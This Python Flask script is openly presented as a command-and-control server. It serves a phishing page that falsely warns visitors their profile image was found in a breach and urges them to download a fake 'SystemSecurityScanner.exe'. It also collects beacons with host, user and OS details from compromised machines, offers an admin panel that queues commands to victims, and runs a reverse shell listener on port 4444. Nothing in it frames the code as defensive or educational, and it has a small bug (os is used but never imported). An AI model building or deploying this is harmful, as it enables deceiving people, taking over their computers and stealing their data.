#!/usr/bin/env python3
"""
C2 Server for Security Scanner
Author: Global Cybersecurity Initiative
"""

from flask import Flask, request, jsonify, render_template_string
import socket
import threading
import json
import time
from datetime import datetime

app = Flask(__name__)

# Store connected clients
connected_clients = {}
commands_queue = {}

# Simple HTML page for the phishing
HTML_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Image Security Alert - Global Cybersecurity Initiative</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 50px auto; padding: 20px; }
        .alert { background: #fff3cd; border: 1px solid #ffeaa7; padding: 20px; border-radius: 5px; }
        .button { background: #dc3545; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; display: inline-block; }
        .footer { margin-top: 30px; font-size: 12px; color: #666; }
    </style>
</head>
<body>
    <h1>🔒 Image Security Alert</h1>
    
    <div class="alert">
        <h2>Urgent: Your Image Found in Data Breach</h2>
        <p>Our monitoring system detected your profile image circulating on dark web forums associated with the recent "Operation Phantom" data breach.</p>
        
        <h3>Compromised Image Details:</h3>
        <ul>
            <li><strong>Image:</strong> Profile photo</li>
            <li><strong>Location Found:</strong> Dark web marketplace</li>
            <li><strong>Risk Level:</strong> HIGH</li>
            <li><strong>Potential Use:</strong> Identity theft, social engineering</li>
        </ul>
        
        <h3>Immediate Action Required:</h3>
        <p>Download and run our security scanner to remove the compromised image and check for other breaches.</p>
        
        <a href="/download/scanner" class="button">Download Security Scanner</a>
        
        <p style="margin-top: 20px; font-size: 14px;">
            <strong>File:</strong> SystemSecurityScanner.exe (v2.1.4)<br>
            <strong>SHA256:</strong> Verified & Signed by Global Cybersecurity Initiative
        </p>
    </div>
    
    <div class="footer">
        <p>Global Cybersecurity Initiative • Official Response Team<br>
        This is an automated security alert. If you believe this is an error, please contact our support team.</p>
    </div>
</body>
</html>
"""


@app.route('/')
def index():
    """Phishing page"""
    return render_template_string(HTML_PAGE)


@app.route('/download/scanner')
def download_scanner():
    """Serve the malicious file"""
    # In real scenario, you'd serve the actual backdoor file
    return "Security scanner download would start here", 200


@app.route('/beacon', methods=['POST'])
def beacon():
    """Receive data from compromised systems"""
    try:
        data = request.json
        client_id = data.get('hostname', 'unknown')

        print(f"\n🎯 NEW BEACON FROM: {client_id}")
        print(f"📍 IP: {request.remote_addr}")
        print(f"🖥️  OS: {data.get('os', 'unknown')}")
        print(f"👤 User: {data.get('user', 'unknown')}")
        print(f"⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

        # Store client info
        connected_clients[client_id] = {
            'ip': request.remote_addr,
            'last_seen': datetime.now(),
            'data': data
        }

        # Check if we have commands for this client
        if client_id in commands_queue and commands_queue[client_id]:
            command = commands_queue[client_id].pop(0)
            return jsonify({'status': 'command', 'command': command})

        return jsonify({'status': 'ok'})

    except Exception as e:
        print(f"Error in beacon: {e}")
        return jsonify({'status': 'error'})


@app.route('/admin')
def admin():
    """Admin panel to see connected clients"""
    html = "<h1>Connected Clients</h1>"
    for client_id, info in connected_clients.items():
        html += f"""
        <div style="border: 1px solid #ccc; padding: 10px; margin: 10px;">
            <h3>{client_id}</h3>
            <p>IP: {info['ip']}</p>
            <p>Last Seen: {info['last_seen']}</p>
            <p>OS: {info['data'].get('os', 'unknown')}</p>
            <form method="post" action="/admin/command">
                <input type="hidden" name="client_id" value="{client_id}">
                <input type="text" name="command" placeholder="Enter command" style="width: 300px;">
                <input type="submit" value="Send Command">
            </form>
        </div>
        """
    return html


@app.route('/admin/command', methods=['POST'])
def send_command():
    """Send command to client"""
    client_id = request.form['client_id']
    command = request.form['command']

    if client_id not in commands_queue:
        commands_queue[client_id] = []

    commands_queue[client_id].append(command)
    return f"Command queued for {client_id}: {command}"


def start_reverse_shell_listener(port=4444):
    """Start traditional reverse shell listener"""
    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.bind(('0.0.0.0', port))
        server.listen(5)
        print(f"🔄 Reverse shell listener started on port {port}")

        while True:
            client_socket, addr = server.accept()
            print(f"🎯 New reverse shell from {addr}")

            # Handle client in new thread
            client_thread = threading.Thread(
                target=handle_reverse_shell,
                args=(client_socket, addr)
            )
            client_thread.start()
    except Exception as e:
        print(f"Reverse shell error: {e}")


def handle_reverse_shell(client_socket, addr):
    """Handle reverse shell connection"""
    try:
        while True:
            command = input(f"shell@{addr}$ ")
            if command.lower() == 'exit':
                break
            if command.strip() == '':
                continue

            client_socket.send(command.encode() + b'\n')
            output = client_socket.recv(4096).decode()
            print(output)
    except Exception as e:
        print(f"Shell session ended: {e}")
    finally:
        client_socket.close()


if __name__ == '__main__':
    # Start reverse shell listener in background thread
    shell_thread = threading.Thread(target=start_reverse_shell_listener)
    shell_thread.daemon = True
    shell_thread.start()

    # Start Flask web server
    print("🚀 Starting C2 Server...")
    print("📧 Phishing page: http://your-server.com/")
    print("📡 Beacon endpoint: http://your-server.com/beacon")
    print("👨‍💼 Admin panel: http://your-server.com/admin")

    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
